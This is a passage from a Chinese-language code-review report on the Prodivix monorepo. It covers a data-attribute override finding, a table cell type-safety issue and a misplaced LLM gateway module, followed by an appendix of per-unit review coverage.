- **类别**: security ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ui-container

**详情**: 原描述 4 个组件不准确:packages/ui 实际有 31 个文件直接铺开(PdxList/PdxTag/PdxBadge/PdxTree/PdxOutlet/PdxRoute 等)。机制属实但无提权:PIR node.props 与 dataAttributes 同为文档作者可控的 JSON 字段,作者可直接写 src;React 转义属性值并阻断 javascript: URL,无 XSS。实际危害是净化边界不一致,以及畸形/导入文档静默顶掉 id/className 或以字符串使 onClick 失效。

**失败场景**: PIR 文档/AI 导入的节点携带 dataAttributes 含 src https://evil/x.png(无 data- 前缀)渲染 PdxImage,img 实际加载攻击者指定图片而非 src prop;若携带 id/className 键则劫持元素 id,破坏 aria-controls/label 关联与 CSS 命中。相同键在 PdxAvatar 等组件上会被静默丢弃,跨组件行为不一致。

**修复建议**: 相关组件统一改用 getDataAttributes(dataAttributes)(与 PdxCard 等一致),或在 getDataAttributes 中对无前缀键显式加 data- 前缀,使净化边界全局一致。

**验证备注**: PdxImage.tsx:36,48 在 src(43)/id(42) 之后铺开 dataProps,JSX 后覆盖前成立;PdxDiv:108-109 同样在 onClick 后铺开。对照 PdxAvatar.tsx:88 走 foundation/component.ts:25-31 的 getDataAttributes(仅留 data- 前缀)。PdxComponent.ts:7 类型为 Record string string 无约束。

#### 3.4.7 type-safety

##### L-TS-01 默认单元格渲染将 unknown 值强转 ReactNode,对象字段直接崩溃

- **位置**: [`packages/ui/src/data/PdxTable.tsx:163`](packages/ui/src/data/PdxTable.tsx#L163)
- **类别**: type-safety ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ui-data

**详情**: 强转属实:PdxTable.tsx:161-163 与 PdxDataGrid.tsx:127 将 unknown 值 as ReactNode 直接渲染,React 19 对对象/Date 子节点会抛 Objects are not valid as a React child,且 apps/web 无 ErrorBoundary。但 Blueprint 目录目前仅以静态字符串样例(TABLE_DATA/GRID_DATA)做缩放预览,无 PIR/运行时数据绑定路径(pir-react-renderer 无 PdxTable 引用),可视化搭建用户绑定 Date 字段即触发当前不可达;属潜在类型安全隐患而非现行崩溃。

**失败场景**: 消费方渲染 PdxTable data 含 createdAt 为 new Date() columns 未提供 render:渲染期抛 RangeError/TypeError 级异常,无 ErrorBoundary 时整个编辑器子树白屏;Blueprint 目录将 PdxTable/PdxDataGrid 暴露给可视化搭建用户,绑定含 Date/对象字段的记录即可触发。

**修复建议**: 默认路径对不可渲染值做兜底,如 value == null 时 null、typeof value === object 时 String(value)、否则 as ReactNode,或保留 unknown 类型让 TS 在编译期暴露缺失的 render。

**验证备注**: PdxTable.tsx:153 record[dataIndex] 为 unknown(L49),L161-163 无 render 时 as ReactNode 强转;PdxDataGrid.tsx:115-127 同。react ^19.2.7 对对象/Date 子节点抛异常,apps/web 无 ErrorBoundary。但现有消费方 sampleData 为静态字符串,无运行时绑定路径。

---

## 4. 架构契约违反

本节汇总 category 为 `architecture` 的发现。本轮审查共确认 **1** 条架构契约违反,源自全局架构契约专项扫描(sweep-architecture)。

### 4.1 AI 领域核心错置于 @prodivix/shared,领域包 @prodivix/ai 反向依赖

- **位置**: [`packages/shared/src/llm/gateway.ts:92`](packages/shared/src/llm/gateway.ts#L92)
- **严重度**: medium ｜ **类别**: architecture ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: sweep-architecture
- **对应正文编号**: M-A-01

**违反的契约**: CLAUDE.md 仓库地图明确 `packages/shared` 仅承载「genuinely cross-domain types and utilities; do not move domain ownership back here」,而 `packages/ai` 才是「AI provider abstractions and shared AI utilities」的指定归属。

**事实**: LlmGateway(gateway.ts:92,docstring 自述「Prodivix 内部 AI 调用链路的统一入口」)、LlmToolRegistry(toolRegistry.ts:3)、LlmTraceStore/InMemoryLlmTraceStore(traceStore.ts:3,7)、LlmContextBuilder(contextBuilder.ts:3)、MockLlmProvider(mockProvider.ts:8)以及全部 AI 契约类型 LlmProvider/LlmTaskRequest/LlmStructuredOutput/LlmProviderError(types.ts)都位于 `packages/shared/src/llm`,并经 index.ts:2 `export * from './llm/index.js'` 对外导出。这些是 AI 领域的编排行为与核心契约,而非真正跨域的工具类型。同时 `@prodivix/ai`(package.json:15)反向依赖 `@prodivix/shared`(workspace 协议),形成「领域包依赖基础设施包获取自身抽象」的层级倒挂。

**影响**: 演进 LlmProvider 接口或新增 AI 编排能力必须改动并发布 `@prodivix/shared`,所有 shared 消费方(ui/compiler 等传递图)被迫拉入整套 AI 域与 Mock/InMemory 实现;shared 的发版周期绑架 AI 契约演进;编辑器 AI 面板从 shared 而非 `@prodivix/ai` 引入网关,使 AI 行为治理被劈成两条导入路径。后续 AI 功能会继续向 shared 堆积,侵蚀其跨域工具定位。

**修复建议**: 将 `packages/shared/src/llm` 整体迁入 `@prodivix/ai`(gateway/toolRegistry/traceStore/contextBuilder/mockProvider/types),shared 仅保留 safety/iconPolicy/PdxComponent 等真正跨域工具;去掉 `@prodivix/ai` 对 `@prodivix/shared` 主入口的依赖(如需仅引 `./safety` 子路径);编辑器与 AI 调用方统一从 `@prodivix/ai` 引入 LlmGateway 等。若 LlmProvider 契约确需多域可见,应抽出到显式声明的 AI 契约包而非 shared。

> 全局架构扫描其余 9 项契约核查结论:shared 不反向依赖其它领域包(`git grep "from '@prodivix" -- packages/shared` 0 命中),唯一违反即上述 LLM 领域错置。

---

## 5. 附录:各审查单元 coverage 一览

下表按审查单元列出其 coverage 原文(共 62 个单元;其中 `app-runner-worker`、`sweep-err-conc` 两个单元审查代理失败或被跳过)。

##### web-bp-canvas — Web/Blueprint 画布与控制器

枚举并全量精读范围内全部 24 个 git 跟踪文件:canvas/ 9 个(BlueprintEditorCanvas.tsx、CanvasPlaceholder.tsx、CanvasRouteDiagnostics.tsx、CanvasSvgFilters.tsx、canvasGeometry.ts、canvasTypes.ts、index.ts、routeDiagnostics.ts、useActiveRoutePreview.ts),controller/ 7 个(blueprintCanonicalGraph.ts、index.ts、inspectorUtils.ts、useBlueprintEditorController 等)。

##### web-bp-insp-a — Web/Blueprint Inspector 组件与字段

审查范围内 git 跟踪文件共 34 个,逐个 Read 了其中 32 个生产源码文件:components/ 下 10 个(ColorInput、IconButtonGroup、IconPickerModal、InspectorPanelFrame、InspectorRow、InspectorTabBar、InspectorTextInput、LinkBasicsFields、PresetInput、UnitInput),classProtocol/ 下 11 个(ClassProtocolEditor、colorSwatch、engineRegistry、mountedCss、token 等)。

##### web-bp-insp-b — Web/Blueprint Inspector 面板与领域逻辑

范围内共 31 个 git 跟踪文件:21 个生产源码全部逐行 Read(domain/ 3 个模型加 2 个面板 tsx,panels/ 9 个面板加 layoutGroup/ 11 个模块,含 registry/types/capabilities);4 个测试文件略读(ServerRuntimeRoutePanel.test.tsx 通读以确认未固化缺陷,其余 3 个 *.test.ts 仅 grep 关键断言),未发现测试掩盖生产缺陷;范围内无 stories/generated/wire 快照文件。为验证触发路径,额外只读查阅了范围外文件 UnitInput.tsx(确认 px 输出)。

##### web-bp-insp-c — Web/Blueprint Inspector 投影/Tab/元数据 + 组件树

范围内 git 跟踪文件共 29 个:深度审查 27 个生产文件——authoring/(BlueprintAuthoringSurface.tsx、ComponentExtractionDialog.tsx、blueprintEntryDocument.ts)、componentTree/ 全部 7 个、inspector/ 直属 5 个(BlueprintEditorInspector.tsx、CollectionInspectorPanel.tsx、InspectorContext.tsx、InspectorContext.types.ts、inspectorNodeProps.ts)等。

##### web-bp-editor-rest — Web/Blueprint 编辑器侧栏/运行器/其余

审查了范围内全部 27 个生产源码文件并逐一 Read:blueprint/editor/ 直接文件(BlueprintEditor.tsx、collapseButtonStyles.ts);runner/(BlueprintProjectRunnerSurface.tsx、blueprintProjectNetworkBridge.ts、blueprintProjectRunPlan.ts、blueprintProjectRunnerClient.ts、useBlueprintProjectRunner.ts、index.ts);sidebar/ 全部 10 个文件;saveIndicator 等。

##### web-bp-data — Web/Blueprint 目录/布局模式/调色板

审查范围:apps/web/src/editor/features/blueprint/ 下 catalog/(15 个文件)、layoutPatterns/(9 个)、palette/(4 个)及 blueprint/ 直属文件(index.ts、nesting.ts),共 30 个被 git 跟踪文件。生产源码全部逐个完整 Read:catalog 的 ComponentGroups.tsx、builtInManifest.ts、helpers.ts、placeholders.ts、sampleData.tsx、sizeOptions.ts 与 groups/ 下全部 8 个组文件;layoutPatterns 与 palette 全量。

##### web-dev-a — Web/NodeGraph 编辑器(前半)

本分块取 git ls-files 排序后的前一半:索引 0-36,共 37/74 个文件(截止 reactflow/nodeGraphFlowNodes.ts)。逐行精读:NodeGraphEditor.tsx、reactflow/NodeGraphEditorContent.tsx、NodeGraphCanvas.tsx、NodeGraphGraphManager.tsx、NodeGraphContextMenu.tsx、NodeGraphViewportControls.tsx、GraphNode.tsx、graphNodeShared.tsx、graphConnectionValidation 等。

##### web-dev-b — Web/NodeGraph 编辑器(后半)

枚举 apps/web/src/editor/features/development/ 下 git 跟踪文件共 74 个,按 sort 排序后取后一半:0 起始索引 floor(74/2)=37 至 73,共 37 个文件(nodeGraphGroupLayout.ts、nodeGraphI18nTypes.ts、nodeGraphMenuModel.ts、nodeGraphNodeActions.ts、nodeGraphNodeChanges.ts、nodeGraphNodeTypes.ts、nodeGraphRenderStore.ts、nodeGraphStableNode.ts 等)。

##### web-resources — Web/资源与外部库管理

审查范围:apps/web/src/editor/features/resources/ 下全部 git 跟踪文件。逐文件深入 Read 了 40 个生产源码文件(.tsx/.ts):ExternalLibraryManager.tsx、externalLibraryManager/ 全部 8 个模块、workspaceExternalLibraries.ts、PublicResourcePage.tsx、workspacePublicResources.ts、publicTree.ts、publicResourceModel.ts、ResourceFileTree.tsx 等。

##### web-execution — Web/执行会话

范围 apps/web/src/editor/features/execution/ 共 53 个 git 跟踪文件。逐个完整 Read 了全部 33 个生产源文件(约 6.3k 行,含 ExecutionCenter.tsx 1315 行、remoteDataStreamGatewayClient.ts 693 行、useRemoteExecutionTerminal.ts 475 行、remoteDataStreamRunCoordinator.ts、三个 run coordinator、各 gateway client、remoteExecutionHttpPort、remotePreview 等)。

##### web-anim-conflict — Web/动画编辑器 + 修订冲突

完整 Read 了范围内全部 29 个生产源码文件:apps/web/src/editor/features/animation/ 下 17 个(AnimationEditor.tsx、AnimationEditorContent.tsx、AnimationDocumentControls.tsx、useAnimationEditorState.ts、animationEditorUi.ts、state/nodeTargetOptions.ts 及 panels/ 全部 11 个组件);apps/web/src/editor/features/revisionConflict/ 下 12 个。

##### web-code-issues — Web/代码编辑器 + Issues + 组件

审查范围:apps/web/src/editor/features/{code,issues,component}/ 下全部 34 个 git 跟踪文件。逐行精读 28 个生产文件:code/ 12 个(CodeAuthoringOverlay.tsx、CodeAuthoringPage.tsx、CodeAuthoringWorkspace.tsx、CodeEditorActionOverlays.tsx、CodeFileTree.tsx、codeAuthoringModel.ts、codeAuthoringOverlayStore.ts、index.ts、openCodeAuthoring 等)。

##### web-settings-misc — Web/设置 + 测试 + 导出 + 新建

范围内 git 跟踪文件共 37 个。深入 Read 了全部 24 个生产源码:export/(exportCodeModel.ts、exportZip.ts、ExportCode.tsx、ExportCodeHeader.tsx、ExportCodePreview.tsx、ExportFileTree.tsx、CodeViewer.tsx、exportContributions.ts)、newfile/NewResourceModal.tsx、settings/(SettingsDefaults.ts、SettingsShared.tsx、SettingsEffects.tsx、Editor 等)。

##### web-sync-store — Web/Workspace 同步与 store

枚举 git 跟踪文件 42 个,其中生产源码 21 个(约 4,268 行)全部逐行 Read:workspaceSync/ 下 18 个生产文件(workspaceOutboxExecutor、workspaceSettingsOutboxExecutor、indexedDbCausalOutboxStore、indexedDbWorkspaceLocalReplicaStore、indexedDbWorkspaceOutboxStore、indexedDbWorkspaceSettingsOutboxStore、WorkspaceOutboxEffects、localProjectWorkspace 等)。

##### web-editor-core — Web/编辑器核心(导航/快捷键/语言/编译/根文件)

完整审查范围内全部 41 个 git 跟踪的生产文件并逐一 Read:editor/ 直属 14 个(Editor.tsx、EditorHome.tsx、ProjectHome.tsx、ProjectCard.tsx、editorApi.ts、localProjectStore.ts、localWorkspaceAssetBlobStore.ts、pluginGatewayServices.ts、EditorDebugFloatingBall.tsx、editorDebugVisibility.ts、codeMirrorTypography.ts、tips.ts、EditorTipsRandom 等)。

##### web-plugins — Web/插件组合层

审查了 apps/web/src/plugins/ 下全部 24 个被 git 跟踪的生产文件:platform/ 根目录 17 个(含 types.ts、index.ts 两个纯类型/导出文件)、platform/contributions/ 7 个解析器与校验器、browser/conformanceHarness.ts。本分块重点关注沙箱桥接/权限/消息通道:实际消息通道实现在范围外的 @prodivix/plugin-browser,范围内仅 createWorkspaceWebPluginPlatform.ts 负责组合 sandboxFactory/gatewaySessionFactory。

##### web-app-infra — Web/应用基础设施(i18n/assets/infra/pir/auth)

共枚举 56 个跟踪文件,亲自逐行 Read 的生产源码 18 个:auth/ 5 个(authApi.ts、useAuthStore.ts、AuthSessionSync.tsx、AuthPage.tsx、ProfilePage.tsx);infra/api/ 4 个(apiClient.ts、apiConfig.ts、apiError.ts、index.ts);infra/git/ 3 个(browserGitClient.ts、browserGitAssetProjection.ts、index.ts);pir/ 2 个有内容的生产文件(createPublishedPirProjection 等)。

##### web-app-shell — Web/应用外壳(路由/首页/社区/AI/根文件)

审查了范围内全部 28 个 git 跟踪文件并逐一 Read。生产源码全文精读:apps/web/src/App.tsx、main.tsx、vite-env.d.ts、ai/aiSettingsStore.ts、community/{communityApi.ts,CommunityPage.tsx,CommunityDetailPage.tsx}、components/ThemeSync.tsx、esm-bridge/registerHostReactBridge.ts、home/Home.tsx、shortcuts/{guards.ts,index.ts,useWindowKeydown} 等。

##### pkg-ws-component — packages/workspace 组件语义

审查范围:packages/workspace/src/component/ 下全部 28 个 git 跟踪文件中的 16 个生产源码文件逐一完整 Read(workspaceComponentAuthoringTransaction.ts、workspaceComponentDefinitionTransaction.ts、workspaceComponentExtractionTransaction.ts、workspaceComponentExtractionReferences.ts、workspaceComponentExtractionReference.types.ts 等)。

##### pkg-ws-core — packages/workspace 核心

审查范围:packages/workspace/src/ 直接文件、src/data/、src/authoring/ 下全部 git 跟踪文件(共约 47 个)。逐行精读 35 个生产源码文件:workspaceCommand.ts、workspaceCodec.ts、workspaceHistory.ts、workspaceHistoryReplay.ts、workspaceOperation.ts、validateWorkspaceVfs.ts、workspaceVfsIntent.ts、workspaceDocumentFactory.ts、workspaceProjection.ts 等。

##### pkg-ws-sync — packages/workspace-sync

完整逐行 Read 了 packages/workspace-sync 下全部 18 个生产源码文件(约 6.6k 行):workspaceOutbox.ts、workspaceLocalReplica.ts、workspaceSettingsOutbox.ts、workspaceOperationCommit.ts、workspaceOperationCommitWire.ts(992 行全读)、workspaceOperationCommitProjection.ts、workspaceOperationCommitWriteSet.ts、workspaceOperationCommitRetention 等。

##### pkg-compiler-react — packages/prodivix-compiler React 编译

范围内 git 跟踪文件共 37 个。逐个完整 Read 了全部 25 个生产源码:adapter.ts、bindingCompiler.ts、collectionRuntime.ts、compiler.types.ts、controlledCss.ts、controlledReactJsx.ts、controlledRoundTrip.ts(1430 行全读)、dataOperationRuntime.ts、documentCompiler.ts、importRegistry.ts、index.ts、moduleNaming.ts、nodeCompiler.ts 等。

##### pkg-compiler-export — packages/prodivix-compiler 导出与可执行工程

审查范围:packages/prodivix-compiler/src/export/(22 个文件)与 src/executableProject/(10 个文件),共 32 个 git 跟踪文件。逐个全文 Read 了全部 28 个生产源码文件(planner.ts、types.ts、pathPlanner.ts、importPlanner.ts、stylePlanner.ts、assetPlanner.ts、filePlanner.ts、artifactPlanner.ts、codeArtifactPlanner.ts、dependencyPlanner.ts、programBuilder 等)。

##### pkg-pir — packages/pir 领域语义

范围内 git 跟踪文件共 62 个:深度 Read 了全部约 40 个生产源码(pir.types.ts、wire.ts、index.ts、pirFactory.ts、pirValidator.ts、pirBindingValidator.ts、pirDataOperationInput.ts;codec/pirCodec.ts、pirMigrationRegistry.ts、pirWireMigrationV13ToV14/V14ToV15/V15ToV16.ts;mutations/ 全部 7 个;extraction/ 全部 6 个;projection/ 全部 5 个;authoring 等)。

##### pkg-pir-renderer — packages/pir-react-renderer + compiler 其余

共深入 Read 审查 32 个生产源码文件:pir-react-renderer 全部 21 个生产文件(PIRRenderer.tsx、PIRRenderer.types.ts、document/PIRDocumentProjection.tsx、node/PIRNodeProjection.tsx、node/PIRElementProjection.tsx、component/PIRComponentInstanceProjection.tsx、component/PIRSlotOutletProjection.tsx、collection/PIRCollectionProjection 等)。

##### pkg-authoring — packages/authoring

审查范围 packages/authoring/ 下 git 跟踪的全部 48 个文件。逐行精读 35 个生产源码:authoring.types.ts、authoringDiagnosticProviderRegistry.ts、codeArtifactLifecycle.ts、codeArtifactProviderRegistry.ts、codeAuthoring.ts、codeRefactorImpact.ts、codeSlotRegistry.ts、codeSlotSemanticRelations.ts、controlledSource.ts、dataOperationReference 等。

##### pkg-code-language — packages/code-language

审查范围:packages/code-language/ 下全部 git 跟踪文件(31 个)。逐行精读全部 18 个生产源码文件:src/index.ts、codeLanguageSemanticIds.ts、typescriptProject.ts、typescriptProjectHost.ts、typescriptCodeLanguageProvider.ts、typescriptSemanticContribution.ts、cssLanguageProject.ts、cssCodeLanguageProvider.ts、cssSemanticContribution.ts、shader 等。

##### pkg-runtime-core — packages/runtime-core

审查范围 packages/runtime-core/:用 git ls-files 枚举 53 个被跟踪文件。亲自逐行 Read 了全部 29 个生产源码文件(src/ 下所有非测试 .ts,含 index.ts、package.json):runtimeExecutorRegistry、executionProviderRegistry、execution.types、executionRequest、executionJob、runtimeExecution、executionSession、executionRecovery、executionConsole、executionSecret 等。

##### pkg-runtime-browser — packages/runtime-browser + runtime-vitest

审查范围 packages/runtime-browser/ 与 packages/runtime-vitest/ 共 30 个 git 跟踪文件。逐行精读全部 12 个生产源码:animationPreview.ts、browserAnimationEffectStore.ts、browserAnimationIds.ts、browserNetworkAdapter.ts、browserProjectFileTree.ts、browserProjectRunner.ts、browserProjectRuntime.ts、browserProjectRuntimeHost.ts、browserProjectTestRunner 等。

##### pkg-runtime-remote — packages/runtime-remote

审查范围 packages/runtime-remote/ 共 56 个 git 跟踪文件。逐个全文 Read 了全部 30 个生产源文件:remoteExecutionTerminalBroker.ts、remoteExecutionTerminalBrokerSupport.ts、remoteExecutionTerminalWorkerBroker.ts、remoteExecutionTerminalClient.ts、remoteExecutionTerminalCodec.ts、remoteExecutionTerminalCodecSupport.ts、remoteExecutionControlPlane 等。

##### pkg-runtime-server — packages/runtime-remote-postgres + server-runtime

枚举两个包共 40 个 git 跟踪文件。逐行精读全部 19 个生产源码:runtime-remote-postgres 9 个(postgresExecutionRepository、postgresTransaction、schema、postgresSnapshotStore、postgresTerminalStateStore、postgresRegionalRecovery、postgresRegionalRecoveryOperatorGrantStore、postgresRegionalTrafficAuthority、index);server-runtime 10 个(serverRuntime 等)。

##### pkg-plugin-contracts — packages/plugin-contracts

审查范围 packages/plugin-contracts/(git 跟踪 45 个文件)。逐字通读全部 16 个生产源文件(index.ts、contributionPoints.ts、contributionValidation.ts、diagnostics.ts、jsonPointer.ts、jsonValue.ts、parsePluginManifest.ts、parseAndValidatePluginManifest.ts、parseStrictJsonDocument.ts 及 7 个 validate*.ts)与 3 个构建脚本(generate-contracts.mjs 等)。

##### pkg-plugin-protocol — packages/plugin-protocol + plugin-package

审查范围:packages/plugin-protocol/ 与 packages/plugin-package/ 共 39 个 git 跟踪文件。逐行精读的生产源码:plugin-protocol 的 src/codec/strictJsonCodec.ts、src/codec/runtimeEnvelopeCodec.ts、src/result.ts、src/contracts/{protocolContract,protocolContractRegistry,schemaContracts}.ts、src/session/protocolEndpoint.ts、src/index.ts 等。

##### pkg-plugin-host — packages/plugin-host

审查范围 packages/plugin-host/ 共 39 个 git 跟踪文件。逐个完整 Read 了全部 23 个生产源码文件:lifecycle/(createPluginHost, pluginHost, pluginHostContext, availabilityLifecycle, runtimeLifecycle, permissionLifecycle, operationCoordinator, pluginHostRecord, hostContributionOperations, hostValidation)、contribution/(contributionRegistry 等)。

##### pkg-plugin-browser — packages/plugin-browser + plugin-react-host

枚举 packages/plugin-browser/ 与 packages/plugin-react-host/ 下全部 38 个 git 跟踪文件。逐行精读生产源码:plugin-browser 的 sandbox(createBrowserRuntimeSandboxFactory.ts、sandbox.types.ts)、runtime/createBrowserPluginRuntimeAdapter.ts、scripts/runtime-worker.entry.ts 与 generate-worker-bootstrap.mjs、gateway 全部生产文件(createBrowserGatewaySessionFactory 等)。

##### pkg-plugin-mui-radix — packages/plugin-mui + plugin-radix

审查范围 packages/plugin-mui/ 与 packages/plugin-radix/(git 跟踪共 47 个文件)。逐行精读生产源码:plugin-mui 的 src/index.ts、hostModule.tsx、componentCatalog.ts、muiSurfaceHost.tsx、paletteProjection.tsx,plugin/manifest.json、support-matrix.json 及全部 6 个 contributions JSON(external-library、palette、render-policy、blueprint-template 等)。

##### pkg-plugin-antd-themes — packages/plugin-antd + themes

审查范围:packages/plugin-antd/ 与 packages/themes/ 下全部 47 个 git 跟踪文件。逐行精读的生产源码:themes 的 index.ts、css/createCssVariables.ts、css/createThemeStyleText.ts、css/font-stacks.css、fonts/themeFontRegistry.ts、palette/defaultPalette.ts(.json)、resolver/{detectTokenCycles,resolveThemeManifest,resolveTokenReferences}.ts 等。

##### pkg-data — packages/data

审查了 packages/data/ 下全部 19 个生产源码文件(约 6.7k 行),逐行通读:data.types.ts、dataDocument.ts(2357 行,完整)、dataRuntime.ts、dataDispatchRuntime.ts、dataPolicyRuntime.ts、dataCacheRuntime.ts、dataOptimisticRuntime.ts、dataStreamRuntime.ts、dataIncrementalCollectionRuntime.ts、dataIdempotencyRuntime.ts、dataLifecycleChannel.ts 等。

##### pkg-data-conn — packages/data-http/graphql/asyncapi/mock

范围内 git 跟踪文件共 37 个。逐字完整阅读了 11 个生产源文件:packages/data-http/src/{dataHttpAdapter.ts, dataOpenApiImporter.ts, index.ts}、packages/data-graphql/src/{dataGraphqlAdapter.ts, dataGraphqlImporter.ts, index.ts}、packages/data-asyncapi/src/{dataAsyncApiAdapter.ts, dataAsyncApiImporter.ts, index.ts}、packages/data-mock 等。

##### pkg-ng-anim — packages/nodegraph + animation

审查范围:packages/nodegraph/ 与 packages/animation/ 全部 git 跟踪文件(33 个)。逐字精读 18 个生产源文件:nodegraph 的 nodeGraphExecutor.ts、nodeGraphCodec.ts、wire.ts、nodeGraph.types.ts、nodeGraphExecutionProvider.ts、authoring/nodeGraphCodeSlotProvider.ts、authoring/nodeGraphSemanticContributionProvider.ts、index.ts;animation 的 animationCodec/animationEvaluation 等。

##### pkg-tokens-router — packages/tokens + router

逐行 Read 了范围内全部 15 个生产源码文件:packages/tokens/src 下 8 个(designToken.types.ts、designTokenResolutionPlan.ts、designTokenResolver.types.ts、dtcgDesignTokenCodec.ts、dtcgDesignTokenResolverCodec.ts、designTokenSemanticContributionProvider.ts、designTokenResolverSemanticContributionProvider.ts、index.ts);packages/router 下 7 个。

##### pkg-shared-assets — packages/shared + assets + i18n

逐行精读范围内 31 个 git 跟踪的生产源文件:packages/assets 全部 8 个(binaryAsset.ts、binaryAsset.types.ts、binaryAssetGitProjection.ts、binaryAssetGitProjection.types.ts、binaryAssetPipeline.ts、pngAsset.ts、jpegAsset.ts、index.ts);packages/i18n 全部 4 个(src/index.ts、scripts/translate.ts、resources/en.json、resources/zh-CN.json);packages/shared 的 safety/llm/iconPolicy 等。

##### pkg-ai-diag — packages/ai + diagnostics

审查范围 packages/ai 与 packages/diagnostics/ 共 31 个 git 跟踪文件。逐行精读全部 18 个生产源码:ai 8 个(index.ts、providers/createProvider.ts、providers/discoverOpenAICompatibleModels.ts、providers/openAICompatiblePrompt.ts、providers/openAICompatibleProvider.ts、settings/aiSettings.ts、tasks/createLlmTask.ts、validation/validate 等);diagnostics 10 个。

##### pkg-conformance — packages/golden-conformance + eslint-plugin

审查了范围内全部 45 个 git 跟踪文件并逐一 Read。packages/eslint-plugin-prodivix:7 个文件全部精读(index.ts、3 条规则源码、package.json、tsconfig.json、vitest.config.ts)。packages/golden-conformance:38 个文件中,2 个 emit 快照脚本、12 个 src 生产模块(goldenApp.fixture、goldenAuthoring、goldenScenario、goldenSyncScenario、goldenG1Scenario、generatedProjectHarness 等)。

##### pkg-ui-form — packages/ui 表单组件

审查范围 packages/ui/src/form/ 下全部 19 个生产 .tsx/.ts 文件均逐行 Read:PdxRichTextEditor、sanitizeRichTextEditorHtml、PdxImageUpload、PdxFileUpload、imageUploadPreview、PdxColorPicker、PdxDatePicker、PdxDateRangePicker、PdxTimePicker、PdxVerificationCode、PdxSelect、PdxRadioGroup、PdxRange、PdxField、PdxSlider、PdxRating、PdxRegexInput 等。

##### pkg-ui-data — packages/ui 数据组件

审查范围 packages/ui/src/data/ 共 40 个 git 跟踪文件:逐一完整 Read 了全部 13 个生产组件源码(PdxBadge/PdxCheckList/PdxDataGrid/PdxList/PdxProgress/PdxSpinner/PdxStatistic/PdxSteps/PdxTable/PdxTag/PdxTimeline/PdxTree/PdxTreeSelect 的 .tsx);为评估受控状态与 dataAttributes 行为,额外读了范围外的 foundation/useControllableState.ts 与 foundation/component.ts。

##### pkg-ui-nav-fb — packages/ui 导航与反馈组件

枚举审查范围内 53 个 git 跟踪文件(nav 28 + feedback 25)。逐一精读全部 18 个生产 .tsx:nav 的 PdxTabs、PdxPagination、PdxAnchorNavigation、PdxNav、PdxNavbar、PdxSidebar、PdxRoute、PdxOutlet、PdxBreadcrumb、PdxCollapse;feedback 的 PdxModal、PdxDrawer、PdxPopover、PdxTooltip、PdxNotification、PdxMessage、PdxEmpty、PdxSkeleton。略读 2 个测试文件。

##### pkg-ui-container — packages/ui 容器/文本/输入/图像

范围内 git 跟踪文件共 45 个。逐行精读:13 个生产组件 .tsx(PdxCard/PdxDiv/PdxPanel/PdxSection、PdxAvatar/PdxImage/PdxImageGallery、PdxInput/PdxSearch/PdxTextarea、PdxHeading/PdxKbd/PdxParagraph/PdxText)与全部 14 个 .scss(纯样式,未见功能性缺陷)。略读:3 个测试文件(PdxInput.test.tsx、PdxImageGallery.test.tsx、PdxPanel.test.tsx)——未发现掩盖/固化生产缺陷的断言。

##### pkg-ui-rest — packages/ui 其余(图标/嵌入/视频/基础/按钮/manifest)

本分块覆盖 packages/ui 审查前缀下全部 40 个 git 跟踪文件。逐行精读 18 个生产源码:button/PdxButton.tsx、PdxButtonLink.tsx;icon/PdxIcon.tsx、PdxIconLink.tsx;embed/PdxEmbed.tsx、PdxIframe.tsx;video/PdxVideo.tsx、PdxAudio.tsx;foundation/component.ts、media.ts、useControllableState.ts;manifest/componentManifest.ts、manifest/index.ts;src/index 等。

##### apps-cli-vscode — apps/cli + apps/vscode + vscode-debugger

范围内共 32 个 git 跟踪文件。逐字精读的生产源码/配置:apps/cli/src/cli.ts、src/commands/build.ts、bin/prodivix.js、package.json、tsconfig.json、.gitignore;apps/vscode/src/extension.ts、src/index.ts、src/language/pirDocumentSymbolProvider.ts、package.json、esbuild.js、tsconfig.json、.vscodeignore、.vscode/launch.json、.vscode/tasks.json 等。

##### be-ws-a — Backend workspace 模块(前半)

审查范围:apps/backend/internal/modules/workspace/ 下 git 跟踪文件共 56 个,按字典序排序后取前一半(索引 0-27,共 28 个文件,animation_validator.go 至 operation_commit_types.go)。其中 19 个生产文件全部逐行 Read:animation_validator.go、asset_blob.go、asset_blob_retention.go、data_source_policy_validator.go、data_source_validator.go、design_token_document_validator.go 等。

##### be-ws-b — Backend workspace 模块(后半)

取 apps/backend/internal/modules/workspace/ 全部 56 个 git 跟踪文件排序后的后一半:索引 floor(56/2)=28..55,共 28 个文件。其中 20 个生产源码全部逐行精读:operation_commit_wire_presence.go、patch.go、patch_compare.go、patch_json_value.go、patch_pointer.go、pir_validator.go、response.go、revision_limits.go、route_manifest_validator.go、route_manifest 等。

##### be-remoteexec — Backend remoteexecution 模块

审查范围 apps/backend/internal/modules/remoteexecution/ 共 30 个 git 跟踪文件:17 个生产源码文件全部逐行通读(routes.go、handler.go、terminal.go、data_gateway.go、data_gateway_contract.go、data_gateway_protocol.go、data_gateway_replay_store.go、data_gateway_stream.go、data_gateway_transport.go、isolated_secret_broker.go、server_function 等)。

##### be-env-auth — Backend environment + auth 模块

亲自 Read 了范围内全部 16 个生产源码文件:auth 模块 8 个(doc.go、handlers.go、login_limiter.go、middleware.go、models.go、routes.go、store.go、token.go),environment 模块 8 个(aws_kms.go、crypto.go、handler.go、key_rotation.go、kms.go、models.go、routes.go、store.go)。略读测试文件:auth/store_test.go、login_limiter_test.go、environment 的 store_test.go。

##### be-rest — Backend 其余模块与平台层

审查了范围内全部生产 Go 源码并逐行精读:github 集成(webhook.go、handlers.go、routes.go、store.go、models.go)、project 模块(handlers.go、store.go、store_helpers.go、community_store.go、models.go、routes.go)、platform/database(database.go、pir_wire_migration.go)、platform/http(middleware/cors.go、response/error.go)、platform/identity/random 等。

##### app-runner-worker — apps/remote-runner-worker

(审查代理失败或被跳过)

##### app-runner-cp — apps/remote-runner-control-plane

apps/remote-runner-control-plane/ 共 30 个 git 跟踪文件。逐一完整 Read 了 src/ 下全部 12 个生产源码:httpHandler.ts、main.ts、regionalConfiguration.ts、regionalRecoveryOperatorConfiguration.ts、regionalRecoveryOperatorJob.ts、regionalRecoveryOperatorMain.ts、regionalRecoverySignedProof.ts、secretBrokerClient.ts、terminalStateAware 等。

##### app-hosts — apps/asset-delivery-host + remote-preview-host + plugin-sandbox

